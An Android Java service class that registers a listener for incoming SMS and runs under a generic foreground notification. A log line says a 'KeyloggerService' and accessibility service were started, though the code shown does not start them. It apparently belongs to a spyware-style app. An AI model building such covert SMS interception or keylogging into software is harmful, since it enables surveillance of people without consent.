package com.example.fasterpro11;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Settings;
import android.provider.Telephony;
import android.util.Log;

public class BackgroundService extends Service {

    private static final String TAG = "BackgroundService";
    private SmsReceiver smsReceiver;

    private static final int NOTIFICATION_ID = 1; // Unique ID for the notification
    private static final String CHANNEL_ID = "foreground_service_channel"; // Notification channel ID

    @Override
    public void onCreate() {
        super.onCreate();


        // Register SMS receiver
        smsReceiver = new SmsReceiver();
        IntentFilter smsFilter = new IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
        registerReceiver(smsReceiver, smsFilter);


        // Start the service in the foreground
        startForeground(NOTIFICATION_ID, buildNotification());

        Log.d(TAG, "Service onCreate: Receiver, Observer, KeyloggerService, and MyAccessibilityService started");
    }

    private Notification buildNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            createNotificationChannel();
        }

        Notification.Builder builder = new Notification.Builder(this)
                .setContentTitle("Foreground Service")
                .setContentText("Running in foreground")
                .setSmallIcon(R.drawable.notification_icon);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder.setChannelId(CHANNEL_ID);
        }

        return builder.build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Foreground Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        // Unregister SMS receiver
        unregisterReceiver(smsReceiver);

        Log.d(TAG, " sms Receiver  stopped");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

}
